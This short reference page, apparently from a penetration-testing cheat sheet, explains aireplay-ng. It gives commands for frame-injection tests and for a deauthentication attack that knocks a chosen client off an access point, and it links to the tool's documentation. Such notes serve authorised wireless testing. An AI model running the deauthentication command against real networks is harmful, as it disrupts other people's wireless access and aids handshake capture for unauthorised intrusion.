---
description: Aireplay-ng is used to inject frames.
---

# Aireplay-ng

## Usage

Perform an injection test:

```bash
aireplay-ng -9 wlan1mon
```

Perform a card to card injection test:

```bash
aireplay-ng -9 -i wlan0 wlan1mon
```

Perform a deauthentication attack - This attack sends disassocate packets to one or more clients which are currently associated with a particular access point.

```bash
aireplay-ng -0 1 -a [ACCESS POINT MAC] -c [CLIENT MAC] wlan1mon
```

## References

{% embed url="https://www.aircrack-ng.org/doku.php?id=aireplay-ng" %}

{% embed url="https://www.aircrack-ng.org/doku.php?id=deauthentication" %}
